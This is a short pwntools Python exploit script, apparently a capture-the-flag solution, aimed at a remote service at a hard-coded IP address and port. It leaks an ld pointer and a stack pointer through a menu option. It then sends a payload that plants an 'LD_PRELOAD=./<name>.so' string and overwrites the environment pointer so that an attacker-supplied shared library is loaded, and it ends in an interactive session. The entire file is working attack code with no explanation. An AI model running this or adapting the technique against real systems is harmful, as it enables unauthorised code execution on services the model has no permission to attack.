from pwn import *

FN = 'b6cb83fbeb243e64.so'

context.update(arch='amd64', os='linux')

s = remote('110.10.147.113', 6677)

def menu(v):
    s.recvuntil('> ')
    s.sendline(str(v))

def leakptr():
    menu(3)
    for i in range(4):
        s.recvline()
    s.sendline('1')
    s.sendline('1')
    s.sendline('x')
    lo = int(s.recvline().split(' : ')[0])
    s.sendline('1')
    s.sendline('x')
    hi = int(s.recvline().split(' : ')[0])
    s.sendline('1')
    s.sendline('1')
    s.sendline('1')

    return (hi << 32) | lo

ld_leak = leakptr()
log.info("Leaked ld pointer %#x", ld_leak)
menu(5)
s.sendline('k')
stack_leak = leakptr()
log.info("Leaked stack pointer %#x", stack_leak)

# sample values, only offsets matter
buf = 0xe30
sp = 0xdf0
envp = 0xf88

payload = 'LD_PRELOAD=./' + FN + '\0'
payload = payload.ljust(envp - buf, '\0')
payload += p64(buf - sp + stack_leak)

pause()

menu(1)
s.sendline(payload)
menu(5)
s.sendline("k")

s.interactive()
